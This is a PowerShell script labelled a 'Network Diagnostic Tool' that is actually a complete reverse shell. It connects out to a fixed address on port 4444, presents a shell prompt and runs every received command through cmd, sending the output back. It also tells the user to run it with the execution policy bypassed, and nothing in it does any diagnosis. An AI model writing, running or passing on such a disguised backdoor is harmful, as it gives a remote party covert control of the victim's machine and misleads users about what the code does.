# Network Diagnostic Tool - Basic PowerShell Edition
# Run with: powershell -ExecutionPolicy Bypass -File .\NetDiag.ps1

$ServerHost = "192.168.1.46"
$ServerPort = 4444

Write-Host "Network Diagnostic Tool v3.0" -ForegroundColor Cyan
Write-Host "Connecting to $ServerHost on port $ServerPort..." -ForegroundColor Green

try {
    $client = New-Object System.Net.Sockets.TcpClient
    $client.Connect($ServerHost, $ServerPort)
    
    if ($client.Connected) {
        Write-Host "Connection established!" -ForegroundColor Green
        
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        $writer.AutoFlush = $true
        
        # Send initial message
        $writer.WriteLine("Network Diagnostic Tool - PowerShell Edition")
        $writer.WriteLine("Connection established successfully")
        $writer.WriteLine("Ready for commands")
        
        # Get starting directory
        $currentDir = Get-Location
        $writer.WriteLine("Current directory: $currentDir")
        $writer.Write("PS $currentDir> ")
        
        # Command loop
        while ($client.Connected) {
            $command = $reader.ReadLine()
            
            if ($command -eq $null) {
                break
            }
            
            Write-Host "Received command: $command" -ForegroundColor Yellow
            
            if ($command -eq "exit" -or $command -eq "quit") {
                $writer.WriteLine("Goodbye!")
                break
            }
            
            # Handle cd command
            if ($command.StartsWith("cd ")) {
                $newDir = $command.Substring(3).Trim()
                
                if ($newDir -eq "..") {
                    $parentDir = Split-Path $currentDir -Parent
                    if ($parentDir) {
                        Set-Location $parentDir
                        $currentDir = Get-Location
                        $output = "Changed to: $currentDir"
                    } else {
                        $output = "Already at root"
                    }
                } else {
                    $newPath = Join-Path $currentDir $newDir
                    if (Test-Path $newPath) {
                        Set-Location $newPath
                        $currentDir = Get-Location
                        $output = "Changed to: $currentDir"
                    } else {
                        $output = "Directory not found: $newPath"
                    }
                }
            }
            # Handle pwd command
            elseif ($command -eq "pwd") {
                $output = $currentDir.ToString()
            }
            # Execute other commands
            else {
                try {
                    Set-Location $currentDir
                    $result = cmd /c $command 2>&1
                    if ($result) {
                        $output = $result -join "`n"
                    } else {
                        $output = "[No output]"
                    }
                } catch {
                    $output = "Error: $($_.Exception.Message)"
                }
            }
            
            # Send response
            $writer.WriteLine($output)
            $writer.Write("PS $currentDir> ")
        }
        
        $writer.Close()
        $reader.Close()
        $stream.Close()
        $client.Close()
        
        Write-Host "Connection closed" -ForegroundColor Green
    }
} catch {
    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
}
